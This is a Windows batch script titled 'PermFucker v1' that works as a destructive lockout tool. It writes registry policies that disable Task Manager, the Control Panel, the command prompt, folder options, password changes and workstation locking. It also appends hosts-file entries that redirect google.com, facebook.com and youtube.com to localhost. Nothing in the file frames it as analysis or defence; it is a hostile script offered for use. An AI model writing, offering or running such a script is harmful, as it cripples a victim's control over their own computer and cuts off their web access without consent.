@echo off
echo PermFucker v1
echo are you running on admin?
pause
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableTaskMgr /t REG_DWORD /d 0 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoControlPanel /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo 127.0.0.1       localhost >> %WinDir%\System32\drivers\etc\hosts
echo 127.0.0.1       www.google.com >> %WinDir%\System32\drivers\etc\hosts
echo 127.0.0.1       www.facebook.com >> %WinDir%\System32\drivers\etc\hosts
echo 127.0.0.1       www.youtube.com >> %WinDir%\System32\drivers\etc\hosts
